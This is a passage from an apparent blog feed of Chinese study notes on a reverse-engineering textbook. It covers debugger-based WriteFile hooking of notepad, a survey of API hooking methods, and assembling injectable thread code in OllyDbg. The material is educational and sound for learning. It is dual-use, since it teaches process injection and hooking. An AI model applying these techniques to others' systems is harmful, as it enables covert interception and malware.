class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">SetThreadContext</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in] HANDLE        hThread,</span><br><span class="hljs-params">  [in] <span class="hljs-type">const</span> CONTEXT *lpContext</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>#10.运行调试进程</p><p>一切准备就绪后，接下来就要正常调用WriteFile() API了。调用ContinueDebugEvent() API可以重启被调试进程，使之继续运行。由于在#9已经将CONTEXT.Eip修改为WriteFile()的起始地址，所以会调用执行WriteFile()。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);<br>Sleep(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><blockquote><p>Sleep(0)有什么用？</p><p>首先用源代码运行测试，然后对Sleep(0)语句进行注释处理，再次运行测试（请在notepad中输入文本后，快速反复保存）。比较2种测试结果，并思考有什么不同，以及产生不同的原因。（答案见最后）</p></blockquote><p>#11.设置API “钩子”<br>最后设置API “钩子”，方便下次钩取操作（若略去该操作，由于#1中已经“脱钩”，WriteFile()API钩取将完全处于“脱钩”状态）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                   &amp;g_chINT3, <span class="hljs-keyword">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>DebugLoop()函数的讲解到此结束。建议大家在实际的代码调试过程中分别查看各结构体的值，经过几次调试后，相信大家都能掌握程序的执行流程。</p><blockquote><p>从Windows XP开始就可以调用DebugSetProcessKillOnExit()函数了，我们可以不销毁被调试进程就退出（detach）调试器。需要注意的是，必须在调试器终止前“脱钩”。否则，调用API时就会因为其起始部分仍为0xCC而导致EXCEPTION BREAKPOINT异常。由于此时不存在调试器，所以终止被调试进程。</p></blockquote><p>关于调试器工作原理与异常的内容请参考第48章</p><blockquote><p>Q.在OnExceptionDebugEvent()函数中调用了ContinueDebugEvent()函数后，为什么还要调用Sleep(0)函数？ </p><p>A.调用Sleep(0)函数可以释放当前线程的剩余时间片，即放弃当前线程执行的CPU时间片也就是说，调用Sleep(0)函数后，CPU会立即执行其他线程。被调试进程（Notepad.exe）的主线程处于运行状态时，会正常调用WriteFile() API。然后经过一定时间，控制权再次转移给HookDbg.exe，Sleep(0)后面的“钩子”代码（WriteProcessMemory() API）会被调用执行。若没有Sleep(0)语句，Notepad.exe调用 WriteFile() API的过程中，HookDbg.exe会尝试将WriteFile()API的首字节修改为0xCC。若运气不佳，这可能会导致内存访问异常。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第30章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第29章 API钩取：逆向分析之“花”</title>
    <link href="/1999/02/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC29%E7%AB%A0%20API%E9%92%A9%E5%8F%96%EF%BC%9A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E2%80%9C%E8%8A%B1%E2%80%9D/"/>
    <url>/1999/02/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC29%E7%AB%A0%20API%E9%92%A9%E5%8F%96%EF%BC%9A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E2%80%9C%E8%8A%B1%E2%80%9D/</url>
    
    <content type="html"><![CDATA[<p>第29章API钩取：逆向分析之“花”<br>本章将讲解有关API钩取的内容，详细学习在用户模式下进行API钩取的多种技术。</p><h1 id="29-1-钩取"><a href="#29-1-钩取" class="headerlink" title="29.1 钩取"></a>29.1 钩取</h1><p>代码逆向分析中，钩取（Hooking）是一种截取信息、更改程序执行流向、添加新功能的技术。钩取的整个流程如下： </p><p>□使用反汇编器&#x2F;调试器把握程序的结构与工作原理；</p><p>□开发需要的“钩子”代码，用于修改Bug、改善程序功能； </p><p>□灵活操作可执行文件与进程内存，设置“钩子”代码。</p><p>上述这一系列的工作就是代码逆向分析工程的核心（Core）内容，所以“钩取”被称为“逆向分析之花”。</p><p>钩取技术多种多样，其中钩取Win32 API的技术被称为API钩取。它与消息钩取共同广泛应用于用户模式。API钩取是一种应用范围非常宽泛的技术，希望各位认真学习并掌握。</p><blockquote><p>（1）分析程序时若有程序源代码，大部分情况都不需要使用钓取技术。但是在某些特殊情况（无源代码或难以修改源代码）下使用钓取技术是非常有必要的。</p><p>（2）消息钓取的相关内容请参考第21章</p></blockquote><h1 id="29-2-API是什么"><a href="#29-2-API是什么" class="headerlink" title="29.2 API是什么"></a>29.2 API是什么</h1><p>学习API钩取前首先要了解什么是API （ Application Programming Interface,应用程序编程接口）。Windows OS中，用户程序要使用系统资源（内存、文件、网络、视频、音频等）时无法直接访问。这些资源都是由Windows OS直接管理的，出于多种考虑（稳定性、安全、效率等），Windows OS禁止用户程序直接访问它们。用户程序需要使用这些资源时，必须向系统内核（Kernel）申请，申请的方法就是使用微软提供的Win32 API （或是其他OS开发公司提供的API ）。也就是说，若没有API函数，则不能创建出任何有意义的应用程序（因为它不能访问进程、线程、内存、文件、网络、注册表、图片、音频以及其他系统资源）。图29-1大致描述岀了32位Windows<br>OS进程内存的情况。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC29%E7%AB%A0%20API%E9%92%A9%E5%8F%96%EF%BC%9A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E2%80%9C%E8%8A%B1%E2%80%9D.assets/image-20220225155528338.png" alt="图29-1 用户模式与内核模式"></p><p>为运行实际的应用程序代码，需要加载许多系统库（DLL）。所有进程都会默认加载kernel32.dll库，kernel32.dll又会加载ntdll.dll库。</p><blockquote><p>请注意一些例外情况：某些特定系统进程（如：smss.exe ）不会加载kernel32.dll库。此外，GUI应用程序中，user32.dll与gdi32.dll是必需的库。</p></blockquote><p>用户模式中的应用程序代码要访问系统资源时，由ntdll.dll向内核模式提岀访问申请。下面用一个例子简单说明。<br>假设notepad.exe要打开c:\abc.txt文件，首先在程序代码中调用msvcrt!fopen() API，然后引发一系列的API调用，如下所示：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">-msvcrt!<span class="hljs-built_in">fopen</span>()<br>kernel32!<span class="hljs-built_in">CreateFileW</span>()<br>ntdll!<span class="hljs-built_in">ZwCreateFile</span>()<br>ntdll!<span class="hljs-built_in">KiFastSystemCall</span>()<br>SYSENTER <span class="hljs-comment">// IA-32 Instruction</span><br>→进入内核模式<br></code></pre></td></tr></table></figure><p>如上所示，使用常规系统资源的API会经由kernel32.dll与ntdll.dll不断向下调用，最后通过SYSENTER命令进人内核模式。</p><h1 id="29-3-API-钩取"><a href="#29-3-API-钩取" class="headerlink" title="29.3 API 钩取"></a>29.3 API 钩取</h1><p>通过API钩取技术可以实现对某些Win32 API调用过程的拦截，并获得相应的控制权限。使用API钩取技术的优势如下： </p><p>□在API调用前&#x2F;后运行用户的“钩子”代码。 </p><p>□查看或操作传递给API的参数或API函数的返回值。 </p><p>□取消对API的调用，或更改执行流，运行用户代码。</p><p>对照图29-2可以更好地理解以上内容。</p><h2 id="29-3-1-正常调用API"><a href="#29-3-1-正常调用API" class="headerlink" title="29.3.1 正常调用API"></a>29.3.1 正常调用API</h2><p>图29-2描述了正常调用API的情形。首先在应用程序代码区域中调用CreateFile() API,由于CreateFile() API是kernel32.dll的导出函数，所以，kernel32.dll区域中的CreateFile() API会被调用执行并正常返回。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC29%E7%AB%A0%20API%E9%92%A9%E5%8F%96%EF%BC%9A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E2%80%9C%E8%8A%B1%E2%80%9D.assets/image-20220225155930797.png" alt="图29-2 正常调用API"></p><h2 id="29-3-2-钩取API调用"><a href="#29-3-2-钩取API调用" class="headerlink" title="29.3.2 钩取API调用"></a>29.3.2 钩取API调用</h2><p>图29-3描述的是钩取kernel32!CreateFile()调用的情形。用户先使用DLL注入技术将hook.dll注入目标进程的内存空间，然后用hook!MyCreateFile()钩取对kernel32!CreateFile()的调用（有多种方法可以设置钩取函数）。这样，每当目标进程要调用kemd32!CreateFile() API时都会先调用hook!MyCreateFile()。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC29%E7%AB%A0%20API%E9%92%A9%E5%8F%96%EF%BC%9A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E2%80%9C%E8%8A%B1%E2%80%9D.assets/image-20220225160054451.png" alt="图29-3 钩取API调用"></p><p>钩取某函数的目的有很多，如调用它之前或之后运行用户代码，或者干脆阻止它调用执行等等。实际操作中只要根据自身需要灵活运用该技术即可。这也是API钩取的基本理念。</p><p>实现API钩取的方法多种多样，但钩取的基本概念是不变的。只要掌握了上面的概念，就能 很容易地理解后面讲解的具体实现方法。</p><h1 id="29-4-技术图表"><a href="#29-4-技术图表" class="headerlink" title="29.4 技术图表"></a>29.4 技术图表</h1><p>图29-4是一张技术图表（Tech Map），涵盖了API钩取的所有技术内容。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC29%E7%AB%A0%20API%E9%92%A9%E5%8F%96%EF%BC%9A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E2%80%9C%E8%8A%B1%E2%80%9D.assets/image-20220225160231561.png" alt="图29-4 API钩取技术图表"></p><p>借助这张技术图表，就能（从技术层面）轻松理解前面学过的（此前都是一头雾水）有关API钩取的内容。钩取API时，只要根据具体情况从图表中选择合适的技术即可（应用最广泛的技术已用下划线标出）。</p><p>下面通过示例逐一讲解图表中的技术</p><h2 id="29-4-1-方法对象（是什么）"><a href="#29-4-1-方法对象（是什么）" class="headerlink" title="29.4.1 方法对象（是什么）"></a>29.4.1 方法对象（是什么）</h2><p>首先是关于API钩取方法（Method ）的分类，根据针对的对象（ Object）不同，API钩取方法大致可以分为静态方法与动态方法。</p><p>静态方法针对的是“文件”，而动态方法针对的是进程内存。一般API钩取技术指动态方法，当然在某些非常特殊的情形下也可以使用静态方法。关于这两种方法的说明见表29-1。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC29%E7%AB%A0%20API%E9%92%A9%E5%8F%96%EF%BC%9A%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E2%80%9C%E8%8A%B1%E2%80%9D.assets/image-20220225160340360.png" alt="image-20220225160340360"></p><blockquote><p>静态方法在API钩取中并不常用，这里只简单提及并跳过。</p></blockquote><h2 id="29-4-2-位置（何处）"><a href="#29-4-2-位置（何处）" class="headerlink" title="29.4.2 位置（何处）"></a>29.4.2 位置（何处）</h2><p>技术图表中的这一栏用来指出实施API钩取时应该操作哪部分（通常有3个部分）。</p><p><strong>IAT</strong></p><p>IAT将其内部的API地址更改为钩取函数地址。该方法的优点是实现起来非常简单，缺点是无法钩取不在IAT而在程序中使用的API （如：动态加载并使用DLL时）。</p><p><strong>代码</strong></p><p>系统库（*.dll）映射到进程内存时，从中查找API的实际地址，并直接修改代码。该方法应用范围非常广泛，具体实现中常有如下几种选择： </p><p>□使用JMP指令修改起始代码；</p><p>□覆写函数局部；</p><p>□仅更改必需部分的局部。</p><p><strong>EAT</strong></p><p>将记录在DLL的EAT中的API起始地址更改为钩取函数地址，也可以实现API钩取。这种方法从概念上看非常简单，但在具体实现上不如前面的Code方法简单、强大，所以修改EAT的这种方法并不常用。</p><h2 id="29-4-3-技术（如何）"><a href="#29-4-3-技术（如何）" class="headerlink" title="29.4.3 技术（如何）"></a>29.4.3 技术（如何）</h2><p>技术图表中的这一栏是向目标进程内存设置钩取函数的具体技术，大致分为调试法与注入法两类，注入法又细分为代码注入与DLL注入两种。</p><p><strong>调试</strong></p><p>调试法通过调试目标进程钩取API。可能有人不太明白这句话的意思，“那不是调试吗，怎么会是API钩取呢？”调试器拥有被调试者（被调试进程）的所有权限（执行控制、内存访问等），所以可以向被调试进程的内存任意设置钩取函数。</p><p>这里所说的调试器并不是OllyDbg、WinDbg、IDAPro等，而是用户直接编写的、用来钩取的程序。也就是说，在用户编写的程序中使用调试API附加到目标进程，然后（执行处于暂停状态）设置钩取函数。这样，重启运行时就能完全实现API钩取了（XP以上的系统中也可在被调试者终止之前分离（Detach ）调试器）。</p><p>当然也可以向已有调试器（OllyDbg、WinDbg、IDAPro ）使用自动化脚本，自动钩取API。这种方法的优点是，只要顺利实现，就能获得（对一个进程的）非常强大的钩取效果。不仅可以钩取API,还可以根据需要完全控制程序的执行流向。使用这种方法，即便是在钩取API的过程中，用户也可以暂停程序运行，进行添加、修改、删除API钩取等操作（这是与其他方法最大的不同）。不足之处是需要用户具备调试器的相关知识（或自动化脚本的知识），并且需要大量测试以保证行为的稳定性。这些不足导致该方法（尽管非常强大）的实际应用并不广泛。</p><p><strong>注入</strong></p><p>注入技术是一种向目标进程内存区域进行渗透的技术，根据注入对象的不同，可细分为DLL注入与代码注入两种，其中DLL注入技术应用最为广泛。</p><ul><li><p>DLL注入<br>使用DLL注入技术可以驱使目标进程强制加载用户指定的DLL文件（关于DLL注入技术的详细说明请参考第23章）。使用该技术时，先在要注入的DLL中创建钩取代码与设置代码，然后在DllMain()中调用设置代码，注入的同时即可完成API钩取。</p></li><li><p>代码注入<br>代码注入技术比DLL注入技术更发达（更复杂），广泛应用于恶意代码（病毒、ShellCode等）（杀毒软件能有效检测出DLL注入操作，却很难探测到代码注入操作，所以恶意代码大量使用代码注入技术，以防被杀毒软件查杀）。代码注入技术实现起来要略复杂一些。原因在于，它不像DLL注入技术那样针对的是完整的PE映像，而是在执行代码与数据被注入的状态下直接获取自身所需API地址来使用的。访问代码中的内存地址时必须十分小心，防止访问到错误地址（关于代码注入技术的详细讲解请参考第27章）。</p></li></ul><h2 id="29-4-4-API"><a href="#29-4-4-API" class="headerlink" title="29.4.4 API"></a>29.4.4 API</h2><p>技术图表最后一列给岀各技术具体实现过程中要使用的API。现在大致浏览即可，后面讲解各技术时会详细说明。</p><blockquote><p>除了技术图表中列出的API外，访问其他进程内存时也常常使用OpenProcess()、WriteProcessMemory()、ReadProcessMemory()等 API。</p></blockquote><p>上述讲解十分冗长，虽然令人有些厌倦，但继续学习具体技术之前，先掌握这些理论是十分必要的。若能通过上面的技术图表从理论上掌握所有技术，那么后面的实战中就会轻松得多，并且钩取API时也能快速找到符合具体情况的技术。</p><p>后面我们会逐一学习技术图表中的各种方法（省略对静态方法的说明），通过相应的练习示例再详细讲解。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第29章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第28章 使用汇编语言编写注入代码</title>
    <link href="/1999/02/26/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/"/>
    <url>/1999/02/26/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>第28章使用汇编语言编写注入代码<br>本章将学习使用汇编语言编写注入代码的相关知识与技术。</p><h1 id="28-1-目标"><a href="#28-1-目标" class="headerlink" title="28.1 目标"></a>28.1 目标</h1><p>首先借助OllyDbg的汇编功能，使用汇编语言编写注入代码（ThreadProc()函数）。使用汇编语言能够生成比C语言更自由、更灵活（非标准化的）的代码（如：直接访问栈、寄存器的功能），然后将纯汇编语言编写的ThreadProc()函数注入notepad.exe进程。学习本章要注意与前面讲过的（用C语言编写的）ThreadProc()比较，了解它们的不同点。</p><h1 id="28-2-汇编编程"><a href="#28-2-汇编编程" class="headerlink" title="28.2 汇编编程"></a>28.2 汇编编程</h1><p>大家通常使用C&#x2F;C++语言编写程序，其中具有代表性的开发工具有Microsoft Visual C++与Borland C++ Builder。使用汇编语言编写程序时，常用的开发工具（Assembler）有MASM（Microsoft Macro Assembler）、TASM （Borland Turbo Assembler ）、FASM （Flat Assembler）等。</p><p>就我个人而言，用C&#x2F;C++语言编写程序时使用MS Visual C++开发工具，用汇编语言编写程序时使用MASM编译器。MASM编译器支持多样化的Macro函数以及库文件，编程时使用起来非常方便，其便捷程度几乎与C语言相当。</p><p>设置好MASM编译器后，就可以正常进行汇编编程（Assembly Programming）了。当然还可以在类似Visual C++的C语言开发工具中使用“内联汇编”（Inline Assembly），将汇编指令插入C语言代码。这是非常适合开发入员的方式。本章将向各位介绍一种更适合代码逆向分析的方式，就是使用OllyDbg中的汇编功能编写汇编程序。</p><blockquote><p>OllyDbg的汇编功能支持简单的汇编语言编程，这在代码逆向分析中相当有用（因为调试时经常需要修改各处代码）。</p></blockquote><h1 id="28-3-OllyDbg的汇编命令"><a href="#28-3-OllyDbg的汇编命令" class="headerlink" title="28.3 OllyDbg的汇编命令"></a>28.3 OllyDbg的汇编命令</h1><p>本节将使用OllyDbg的汇编命令编写汇编语言程序。首先使用OllyDbg打开asmtest.exe示例文件（asmtest.exe是为进行汇编语言编程测试而编写的可执行文件（无任何功能））。</p><p>从代码区域的顶端部分（ 401000 ）开始看起，先向大家介绍一个OllyDbg的新命令New origin here，它把EIP更改为指定地址。在OllyDbg的代码窗口中移动光标到401000地址处，在鼠标右键菜单中选择New origin here（Ctrl+Gray*）菜单命令，如图28-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220223204345689.png" alt="图28-2 New origin here(Ctrl+Gray*)菜单命令"></p><p>执行菜单命令后，EIP地址变为401000。</p><p>调试时常常需要更改EIP值，所以New origin here菜单非常有用，希望各位记住它。</p><blockquote><p>New origin here命令仅用来改变EIP值，与直接通过调试方式转到指定地址是不一样的，因为寄存器与栈中内容并未改变。</p></blockquote><p>在401000地址处执行汇编命令（快捷键：Space），将弹岀输入汇编命令的窗口，如图28-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220223204545984.png" alt="图28-4 汇编功能"></p><p>接下来就可以在OllyDbg中编写简单的汇编语言程序了</p><blockquote><p>建议大家在图28-4中取消（uncheck）对“Fill with NOP’s”的复选。OllyDbg的汇编命令用来向相应地址输入用户代码。若“Fill with NOP’s”项处于复选状态，输入代码长度短于已有代码时，剩余长度会填充为NOP （No Operation）指令，以整体对齐代码（Code Alignment）。为便于本章说明，我取消了对“Fill with NOP’s”项目的复选。</p></blockquote><h2 id="28-3-1-编写-ThreadProc-函数"><a href="#28-3-1-编写-ThreadProc-函数" class="headerlink" title="28.3.1 编写 ThreadProc()函数"></a>28.3.1 编写 ThreadProc()函数</h2><p>下面使用汇编语言编写ThreadProc()函数。与前面使用C语言编写的ThreadProc()函数相比，其不同之处在于，需要的Data （字符串）已包含在Code中。请各位参考图28-5输入汇编指令。各条汇编指令的作用将在后面讲解（输入时注意取消对“Fill with NOP’s”的复选，若出现误录，转到相应地址处重新输入即可）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224103919000.png" alt="图28-5 输入ThreadProc()"></p><p>自上而下依次输入汇编指令，直到40102E地址处的CALL指令为止，各位的输入都正确吗？接下来，继续输入字符串。请先关闭Assemble窗口，在OllyDbg代码窗口中，移动光标至401033地址处，打开Edit窗口（快捷键：Ctrl+E）,如图28-6所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224104028783.png" alt="image-20220224104028783"></p><p>在图28-6的Edit窗口向ASCII项输入“ReverseCore”。因字符串必须以NULL结束，故在HEX项的最后输入00值（取消Keep size选项）。像这样完成全部输入后，在OllyDbg中査看代码，如 图28-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224104204434.png" alt="图28-7 “ReverseCore”字符串区域"></p><p>图28-7中灰色部分即是“ReverseCore”字符串区域，可以看到字符串使用非常奇怪的指令进行显示。这样显示的原因在于，OllyDbg的Disassembler （反汇编器）将字符串误认为IA-32指令了。其实，这是由于输入者在Code位置输入字符串引起的，是输入者的错，而不能怪罪OllyDbg的反汇编器。</p><blockquote><p>调试时常常会遇到这种反汇编（Disassemble）问题，有些反调试技术正是利用了这一点，后面讲解反调试时再向大家介绍。</p></blockquote><p>如图28-7所示，选中字符串后再执行Analysis命令（快捷键；Ctrl+A ）,得到图28-8。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224110537536.png" alt="图28-8 执行Analysis命令"></p><p>OllyDbg的Analysis命令用来再次分析代码，再分析Unpack （解码的）代码时经常用到。</p><p>图28-8中的代码是执行了Analysis命令之后的形式。在401033地址处可以清晰地看到前面输入的字符串“ReverseCore”，但是401000地址之后的指令却解析有误（OllyDbg 2.0也无法将代码与数据100%区分开来。事实上，机器本身很难分清它是字符串还是指令）。在图28-8中难以查看代码，使用鼠标右键菜单中的Analysis-Remove analysis from module命令可以将代码恢复原样。使用Remove analysis命令恢复代码，如图28-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224110712277.png" alt="图28-9 Remove analysis from module菜单"></p><p>接下来，使用汇编命令从40103F地址处（位于401033地址的“ReverseCore”字符串后面的地址）开始继续输入指令如图28-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224111000874.png" alt="图28-10 从40103F地址处开始输入指令"></p><p>然后使用编辑命令，在401044地址处输入字符串（“<a href="http://www.reversecore.com”,不要忘记在最后添上null)如图28-11所示./">www.reversecore.com”，不要忘记在最后添上NULL）如图28-11所示。</a></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224111109696.png" alt="图28-11 输入字符串"></p><p>再次使用汇编命令从401058地址处开始输入指令，如图28-12所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224111326807.png" alt="图28-12 汇编代码输入完成"></p><p>至此已将ThreadProc()代码全部输入。图28-13显示了所有输入的代码，请各位对照查看自己输入的代码是否正确</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224111459486.png" alt="图28-13 ThreadProc()代码"></p><blockquote><p>401033、401044地址中的内容不是指令，而是字符串。由于OllyDbg会将字符串识别为指令，所以字符串看上去有些怪异。</p></blockquote><h2 id="28-3-2-保存文件"><a href="#28-3-2-保存文件" class="headerlink" title="28.3.2 保存文件"></a>28.3.2 保存文件</h2><p>编好代码后要保存。在OllyDbg代码菜单中，选择鼠标右键Copy to executable-All modifications菜单（参考图28-14）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224112107635.png" alt="图28-14 Copy to executable-All modifications菜单"></p><p>如图28-15所示，弹岀确认消息框，单击“Copy all”按钮。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224112213235.png" alt="图28-15 单击“Copy all”按钮"></p><p>然后弹出窗口，显示所有修改内容，在鼠标右键菜单中选择Save file项目，如图28-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224112253875.png" alt="图28-16 Save file菜单项目"></p><p>之后弹岀保存文件对话框，输入文件名称（asmtest_patch.exe ）后保存。</p><blockquote><p>Assemble（Space）:输入汇编代码。<br>Analysis（Ctrl+A）:再次分析代码。<br>New origin here（Ctrl+Gray*）:更改 EIP。</p></blockquote><h1 id="28-4-编写代码注入程序"><a href="#28-4-编写代码注入程序" class="headerlink" title="28.4 编写代码注入程序"></a>28.4 编写代码注入程序</h1><p>本节将使用前面创建好的汇编代码编写代码注入程序（Injector）。</p><h2 id="28-4-1-获取ThreadProc-函数的二进制代码"><a href="#28-4-1-获取ThreadProc-函数的二进制代码" class="headerlink" title="28.4.1 获取ThreadProc()函数的二进制代码"></a>28.4.1 获取ThreadProc()函数的二进制代码</h2><p>首先，使用OllyDbg工具打开前面创建的asmtest_patch.exe文件。我们前面编写的ThreadProc()函数地址为401000，在内存窗口中转到401000地址处（转移命令Ctrl+G），如图28-17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC28%E7%AB%A0%20%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81.assets/image-20220224113019688.png" alt="图28-17 